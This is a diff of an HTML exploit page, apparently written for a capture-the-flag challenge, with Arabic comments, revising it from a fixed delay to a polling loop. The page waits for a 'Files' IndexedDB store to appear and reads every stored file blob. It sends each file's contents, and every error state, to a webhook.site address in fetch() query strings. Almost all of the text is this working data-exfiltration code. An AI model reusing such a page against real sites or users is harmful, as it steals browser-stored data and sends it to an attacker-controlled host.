@@ -1,81 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Pwned - V2</title>
+  <title>Pwned - V3 (Polling)</title>
 </head>
 <body>
-  <h1>Extracting directly from 'files' store...</h1>
+  <h1>Waiting for DB to be initialized by the main page...</h1>
   <script>
     // استخدم خادمك أو خدمة مثل requestcatcher.com لتلقي العلم
     const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23/";
+    
+    // سنحاول لمدة 10 ثوانٍ كحد أقصى
+    const MAX_WAIT_TIME = 10000;
+    const POLLING_INTERVAL = 200; // التحقق كل 200 مللي ثانية
+    let elapsedTime = 0;
 
-    async function exfiltrateFlag() {
-      try {
+    function extractFlag() {
+        console.log("DB is ready! Trying to extract the flag.");
+        
+        const dbrequest = indexedDB.open("Files", 1);
+        
+        dbrequest.onsuccess = () => {
+            const db = dbrequest.result;
+            const transaction = db.transaction("files", "readonly");
+            const filesStore = transaction.objectStore("files");
+            const getAllRequest = filesStore.getAll();
+
+            getAllRequest.onsuccess = () => {
+                const allFileObjects = getAllRequest.result;
+                if (!allFileObjects || allFileObjects.length === 0) {
+                    fetch(`${ATTACKER_SERVER}?error=no_files_found_after_wait`);
+                    return;
+                }
+
+                allFileObjects.forEach(fileObject => {
+                    if (fileObject.file && fileObject.file instanceof Blob) {
+                        fileObject.file.text().then(text => {
+                            console.log("Found content:", text);
+                            // إرسال المحتوى. العلم سيكون هنا.
+                            fetch(`${ATTACKER_SERVER}?flag=${encodeURIComponent(text)}`);
+                        });
+                    }
+                });
+            };
+
+            getAllRequest.onerror = (e) => fetch(`${ATTACKER_SERVER}?error=getAll_failed`);
+        };
+
+        dbrequest.onerror = (e) => fetch(`${ATTACKER_SERVER}?error=db_open_failed_final`);
+    }
+
+    function pollForDB() {
+        if (elapsedTime > MAX_WAIT_TIME) {
+            console.error("Timeout: DB was not initialized in time.");
+            fetch(`${ATTACKER_SERVER}?error=timeout`);
+            return;
+        }
+
+        console.log("Polling for DB initialization...");
         const dbrequest = indexedDB.open("Files", 1);
 
         dbrequest.onsuccess = () => {
-          const db = dbrequest.result;
-
-          // Debug: لنرى ما هي الجداول الموجودة فعلاً
-          const existingStores = [...db.objectStoreNames];
-          console.log("Available object stores:", existingStores);
-          fetch(`${ATTACKER_SERVER}?stores=${existingStores.join(',')}`);
-
-          // التحقق من وجود جدول 'files' قبل محاولة قراءته
-          if (!db.objectStoreNames.contains("files")) {
-            console.error("'files' store not found!");
-            fetch(`${ATTACKER_SERVER}?error=files_store_not_found`);
-            return;
-          }
-
-          // لنقرأ كل شيء مباشرة من جدول 'files'
-          const transaction = db.transaction("files", "readonly");
-          const filesStore = transaction.objectStore("files");
-          const getAllRequest = filesStore.getAll();
-
-          getAllRequest.onerror = (event) => {
-             console.error("Error reading from files store:", event.target.error);
-             fetch(`${ATTACKER_SERVER}?error=read_error`);
-          };
-
-          getAllRequest.onsuccess = () => {
-            const allFileObjects = getAllRequest.result;
-            console.log("Found objects in 'files' store:", allFileObjects);
-
-            if (!allFileObjects || allFileObjects.length === 0) {
-              console.log("No files found in the store.");
-              fetch(`${ATTACKER_SERVER}?error=no_files`);
-              return;
+            const db = dbrequest.result;
+            if (db.objectStoreNames.contains("files")) {
+                // نجحنا! الجدول موجود.
+                db.close(); // أغلق الاتصال قبل استدعاء الدالة النهائية
+                extractFlag();
+            } else {
+                // الجدول غير موجود بعد، لننتظر ونحاول مرة أخرى
+                db.close();
+                elapsedTime += POLLING_INTERVAL;
+                setTimeout(pollForDB, POLLING_INTERVAL);
             }
-
-            // تصفح كل الكائنات للعثور على العلم
-            allFileObjects.forEach(fileObject => {
-              // الكائن يحتوي على { id, file, cached, isPublic }
-              // الـ'file' هو Blob الذي نريده
-              if (fileObject.file && fileObject.file instanceof Blob) {
-                fileObject.file.text().then(text => {
-                  console.log("Reading content:", text);
-                  // إرسال كل المحتويات التي نجدها. إحداها ستكون العلم.
-                  fetch(`${ATTACKER_SERVER}?content=${encodeURIComponent(text)}`);
-                });
-              }
-            });
-          };
-        };
-        
-        dbrequest.onerror = (event) => {
-            console.error("DB open error:", event.target.error);
-            fetch(`${ATTACKER_SERVER}?error=db_open_error`);
         };
 
-      } catch (e) {
-        console.error("Exploit failed:", e);
-        fetch(`${ATTACKER_SERVER}?error=${encodeURIComponent(e.toString())}`);
-      }
+        dbrequest.onerror = () => {
+            // حدث خطأ أثناء الفتح، لنحاول مرة أخرى
+            elapsedTime += POLLING_INTERVAL;
+            setTimeout(pollForDB, POLLING_INTERVAL);
+        }
     }
 
-    // زدنا الوقت قليلاً للتأكد من أن البوت قد انتهى من الكتابة في قاعدة البيانات
-    setTimeout(exfiltrateFlag, 3000);
+    // ابدأ عملية المراقبة
+    pollForDB();
 
   </script>
 </body>
